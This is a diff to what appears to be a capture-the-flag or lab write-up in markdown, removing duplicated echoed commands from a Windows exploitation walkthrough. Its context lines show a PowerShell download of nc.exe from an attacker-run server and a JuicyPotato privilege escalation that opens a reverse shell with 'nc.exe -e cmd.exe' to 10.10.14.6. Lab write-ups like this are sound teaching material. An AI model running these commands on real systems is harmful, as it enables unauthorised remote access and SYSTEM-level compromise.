@@ -250,7 +250,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 - Transfer `nc`
 ```
 C:\Users\Public>powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/nc.exe', 'C:\Users\public\nc.exe')" -bypass executionpolicy
-powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/nc.exe', 'C:\Users\public\nc.exe')" -bypass executionpolicy
+
 Invoke-Expression : Cannot bind argument to parameter 'Command' because it is null.
 At line:1 char:4
 + IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6:8000/nc ...
@@ -298,7 +298,7 @@ nt authority\system
 - Running `JuicyPotato` and catching a reverse shell in `nc`
 ```
 C:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe -e cmd.exe 10.10.14.6 443" -t *
-JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe -e cmd.exe 10.10.14.6 443" -t *
+
 Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 ......
 [+] authresult 0
